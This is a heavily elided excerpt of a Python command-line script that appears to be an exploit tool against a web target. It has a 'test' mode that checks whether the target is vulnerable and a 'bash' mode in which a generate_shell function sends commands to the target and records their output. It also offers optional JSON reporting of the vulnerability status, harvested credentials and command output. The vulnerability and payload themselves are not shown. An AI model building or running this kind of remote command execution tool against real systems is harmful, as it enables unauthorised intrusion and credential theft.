...
# SSL context for HTTPS targets. The python.org macOS installer ships without
# CA certificates configured, so prefer certifi's bundle when it is installed.
try:
    import certifi
...
# Structured result reporting: when --output is given, record() persists every
# field incrementally so a killed process still leaves a partial JSON result.
result_path = ""
result_data = {}


def record(**fields):
    result_data.update(fields)
    if result_path:
        try:
...
def generate_shell(command=None):
...
""".encode()
    ...
    with urllib.request.urlopen(command_request, timeout=60, context=ssl_context) as response:
    ...
    record(command=command, command_output=command_result["output"])


def main():
    global base_url, batch_url, result_path
    ...
    parser.add_argument(
        "-c",
        "--command",
        help="command to run with --bash (falls back to an interactive prompt if omitted)",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="write the structured JSON result (vulnerable/credentials/command output) to this path",
    )
    ...
    record(url=base_url, mode="test" if args.test else "bash")

    try:
        if args.test:
            test()
        else:
            generate_shell(args.command)
